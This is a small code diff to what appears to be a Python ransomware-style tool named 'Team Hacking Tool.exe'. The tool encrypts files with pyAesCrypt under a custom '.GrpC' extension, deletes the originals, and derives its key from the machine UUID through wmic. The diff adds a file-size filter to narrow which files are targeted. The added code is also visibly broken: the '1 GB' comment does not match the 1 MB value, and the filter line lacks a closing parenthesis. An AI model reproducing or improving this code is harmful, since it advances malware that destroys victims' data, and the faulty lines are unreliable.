@@ -5,6 +5,7 @@ from pyAesCrypt import encryptFile, decryptFile
 
 project_name = "Team Hacking Tool.exe"
 filext = ".GrpC"
+filelimit = 1024 * 1024 # 1 GB
 
 def find_files(mode="E"):
     allFiles = []
@@ -39,6 +40,10 @@ def decryptFiles(files, password):
             os.remove(file)
         except:
             pass
+
+def filter_file_size(files):
+    files = list(filter(lambda x: x.st_size <= filelimit, files)
+    return files
 
 def genpass():
      password = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
